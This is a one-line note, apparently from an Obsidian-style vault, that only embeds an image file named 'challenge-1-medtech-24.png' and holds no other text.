![[attachments/challenge-1-medtech-24.png]]
